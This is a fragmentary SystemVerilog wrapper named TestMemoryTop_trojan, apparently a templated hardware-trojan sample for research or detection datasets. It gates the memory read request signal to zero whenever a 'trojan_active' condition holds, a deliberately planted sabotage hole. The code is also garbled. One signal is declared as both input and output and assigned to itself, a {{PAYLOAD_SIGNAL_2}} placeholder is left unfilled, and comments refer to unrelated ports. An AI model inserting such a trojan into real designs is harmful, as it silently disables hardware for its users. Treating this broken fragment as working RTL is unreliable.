...
module TestMemoryTop_trojan (
    input  logic clk_p,
    input  logic rstOut,
    
    // Original module signals (passthrough)
    input  logic MemReadAccessReq,
    output logic MemReadAccessReq,
    ...
    assign MemReadAccessReq = trojan_active ? 1'b0 : MemReadAccessReq_normal;
    ...
    logic MemReadAccessReq_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign MemReadAccessReq_normal = MemReadAccessReq;
 ...
 *     input  logic instr_valid_i,   // MemReadAccessReq
 *     output logic instr_valid_o    // MemReadAccessReq
 * );
